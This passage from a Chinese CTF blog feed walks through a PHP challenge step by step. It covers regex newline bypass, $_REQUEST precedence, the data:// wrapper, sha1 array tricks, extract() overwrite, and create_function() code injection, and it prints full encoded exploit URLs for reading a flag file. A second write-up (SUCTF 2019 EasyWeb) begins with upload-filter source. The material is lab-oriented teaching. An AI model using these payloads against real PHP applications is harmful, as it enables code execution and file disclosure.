<code>$_GET[]会自动将参数进行url解码</code></p></blockquote><p>综上：我们需要将url中所有存在关键字的参数全部urlencode即可绕过</p><h4 id="二：绕过-aqua-is-cute"><a href="#二：绕过-aqua-is-cute" class="headerlink" title="二：绕过 /^aqua_is_cute$/"></a>二：绕过 <code>/^aqua_is_cute$/</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br></code></pre></td></tr></table></figure><p>我们需要使正则 <code>/^aqua_is_cute$/</code> 成立，但是字符串又不等于它，怎么才能做到呢？</p><p>我们可以在<code>字符串结尾加上换行符 %0A 绕过</code>，<strong>正则不会匹配末尾的换行符</strong></p><p>但是我们正则修改为：<code>/^aqua_is_cute$/D</code> 就不能进行绕过了，</p><p>因为 <strong><code>/D</code></strong> 会<code>修正末尾$对于换行符的匹配</code> ，</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^abc$/D&quot;</span>, <span class="hljs-variable">$s</span>) &amp;&amp; <span class="hljs-variable">$s</span> !== <span class="hljs-string">&quot;abc&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nb&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;loser&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/13/RKLPxrsNIuWBfUM.png" alt="image-20230313180406941"></p><h4 id="三：绕过-a-zA-Z"><a href="#三：绕过-a-zA-Z" class="headerlink" title="三：绕过 /[a-zA-Z]/"></a>三：绕过 <code>/[a-zA-Z]/</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br></code></pre></td></tr></table></figure><p>这里使用了 <code>$_REQUEST</code> 判断参数值中是否存在字母</p><p>这里有一个关于<code>$_REQUEST 优先级问题</code></p><blockquote><p>当 <code>$_GET[]</code>与<code>$_POST[]</code> 中参数名相同时，<code>$_REQUEST[]</code> 会有限使用 <code>$_POST[]</code> 的值</p></blockquote><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/13/qfKa6AxFdbkmQDl.png" alt="image-20230313181038979"></p><p>因此，我们只需在get传参时，同时传入同名的post参数，参数值为数字即可绕过</p><h4 id="四：绕过-file-get-contents-file"><a href="#四：绕过-file-get-contents-file" class="headerlink" title="四：绕过 file_get_contents($file)"></a>四：绕过 <code>file_get_contents($file)</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>); <br></code></pre></td></tr></table></figure><p>这个是文件包含漏洞，我们可以使用<code>data伪协议</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=data:<span class="hljs-comment">//text/plain,debu_debu_aqua</span><br></code></pre></td></tr></table></figure><h4 id="五：绕过-sha1"><a href="#五：绕过-sha1" class="headerlink" title="五：绕过 sha1()"></a>五：绕过 <code>sha1()</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$shana</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>sha1()</code> 和 <code>md5()</code> 一样 ，当我们传入的参数为数组时就会返回 NULL, 即可绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">shana[]=<span class="hljs-number">1</span>&amp;passwd[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h4 id="六：create-function-命令执行"><a href="#六：create-function-命令执行" class="headerlink" title="六：create_function()命令执行"></a>六：create_function()命令执行</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>这里的重点是：</p><p>第五点的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br></code></pre></td></tr></table></figure><p><code>extract()函数</code>作用是：将数组值 赋值给数组名同名的变量</p><p>我们可以通过这里去产生 <code>$code</code>、<code>$arg</code> 变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br></code></pre></td></tr></table></figure><p><code>$code(&#39;&#39;, $arg); </code> 这一句十分重要</p><p>由于括号中使用的是逗号，我们一般的命令执行应该使用不了，参数不能控制。</p><p>了解到一种新的方法：<code>create_function()代码注入</code></p><blockquote><p>从<code>PHP 7.2.0</code>开始，<code>create_function()</code>被废弃</p></blockquote><p>文章：<a href="https://www.cnblogs.com/-chenxs/p/11459374.html">https://www.cnblogs.com/-chenxs/p/11459374.html</a></p><p><code>create_function($arg1,$arg2)</code>会创造一个匿名函数，</p><p>函数的参数部分由 <code>$arg1</code>指定</p><p>函数体由 <code>$arg2</code> 指定</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>会创建以下匿名参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ln(<span class="hljs-subst">$a</span>) + ln(<span class="hljs-subst">$b</span>) = &quot;</span> . <span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$a</span> * <span class="hljs-variable">$b</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以在 $arg2 进行改动，实现代码注入</p><p>如果<code>$arg2 = &#125;phpinfo();//</code>   可以执行<code>phpinfo()</code>函数</p><p>原因：首先 <code>&#125;</code> 将匿名函数的大括号<code>&#125;</code>闭合了，然后 <code>//</code> 将后面的大括号<code>&#125;</code>给注释掉了</p><p>所以，这之间就可以写相应的代码了</p><p>由于这里过滤了很多东西，但是恰好引入了 <code>flag.php</code>，其中一定存在相应的flag变量</p><p>所以我们可以使用 <code>get_defined_vars()</code>函数：返回所有已定义变量组成的数组</p><p>然后使用 <code>var_dump()</code>进行输出</p><p>这样就可以知道有关flag的变量名了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">arg=&#125;<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>综上：</p><p>我们需要将get参数进行url编码，然后将具有字母参数值的所有get参数传入一个同名的post参数(注意需要将请求方式改为post方式)，debu参数在末尾加上%0a绕过，file参数使用data协议绕过，sha1()使用数组绕过</p><p>get</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-number">1</span>nD3x.php?f%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>ce=%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>&amp;d%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>u=%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">0</span>a&amp;sh%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>[]=<span class="hljs-number">1</span>&amp;pas%<span class="hljs-number">73</span>%<span class="hljs-number">77</span>d[]=<span class="hljs-number">2</span>&amp;f%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>fde]=%<span class="hljs-number">63</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e&amp;fl%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>g]=%<span class="hljs-number">7</span>d%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">70</span>%<span class="hljs-number">28</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">64</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f<br></code></pre></td></tr></table></figure><p>post</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=<span class="hljs-number">1</span>&amp;debu=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/13/FUvIM61D9iuQ7Lo.png" alt="image-20230313193606051"></p><p>如图，我们已经输出了所有变量及其值，其中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ffffffff11111114ggggg</span>=<span class="hljs-string">&quot;Baka, do you think it&#x27;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot;</span><br></code></pre></td></tr></table></figure><p>提示我们flag在 <code>rea1fl4g.php</code></p><p>于是我们可以使用文件包含漏洞进行读取flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">arg=&#125;<span class="hljs-keyword">require</span>(php:<span class="hljs-comment">//filter/convert.base64-encode/resource=rea1fl4g.php);//</span><br></code></pre></td></tr></table></figure><p>直接使用url编码是不行的，会有关键字过滤，include也用不了，我们可以使用require</p><p>观察一下，没有过滤：<code>~</code>，于是我们可以取反构造，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">arg=&#125;<span class="hljs-keyword">require</span>(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%C5%D0%D0%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>D%D0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>D%<span class="hljs-number">8</span>B%D1%<span class="hljs-number">9</span>D%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>C%<span class="hljs-number">9</span>A%C9%CB%D2%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">9</span>A%D0%<span class="hljs-number">8</span>D%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>D%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>A%C2%<span class="hljs-number">8</span>D%<span class="hljs-number">9</span>A%<span class="hljs-number">9</span>E%CE%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%CB%<span class="hljs-number">98</span>%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>最终：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">arg=&#125;%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">69</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%C5%D0%D0%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>D%D0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>D%<span class="hljs-number">8</span>B%D1%<span class="hljs-number">9</span>D%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>C%<span class="hljs-number">9</span>A%C9%CB%D2%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">9</span>A%D0%<span class="hljs-number">8</span>D%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>D%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>A%C2%<span class="hljs-number">8</span>D%<span class="hljs-number">9</span>A%<span class="hljs-number">9</span>E%CE%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%CB%<span class="hljs-number">98</span>%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/13/4w58TFSrqiCZxs2.png" alt="image-20230313194510663"></p><p>读取到flag</p><p>最终payload：（%0a不要进行urlencode）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-number">1</span>nD3x.php?f%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>ce=%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>&amp;d%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>u=%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">0</span>a&amp;sh%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>[]=<span class="hljs-number">1</span>&amp;pas%<span class="hljs-number">73</span>%<span class="hljs-number">77</span>d[]=<span class="hljs-number">2</span>&amp;f%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>fde]=%<span class="hljs-number">63</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e&amp;fl%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>g]=&#125;%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">69</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%C5%D0%D0%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>D%D0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>D%<span class="hljs-number">8</span>B%D1%<span class="hljs-number">9</span>D%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>C%<span class="hljs-number">9</span>A%C9%CB%D2%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">9</span>A%D0%<span class="hljs-number">8</span>D%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>D%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>A%C2%<span class="hljs-number">8</span>D%<span class="hljs-number">9</span>A%<span class="hljs-number">9</span>E%CE%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%CB%<span class="hljs-number">98</span>%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);<span class="hljs-comment">//</span><br><br><br>post:<br>file=<span class="hljs-number">1</span>&amp;debu=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EzPHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyWeb</title>
    <link href="/2023/08/24/EasyWeb/"/>
    <url>/2023/08/24/EasyWeb/</url>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>这一题挺不错的</p><p>进去后获得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span 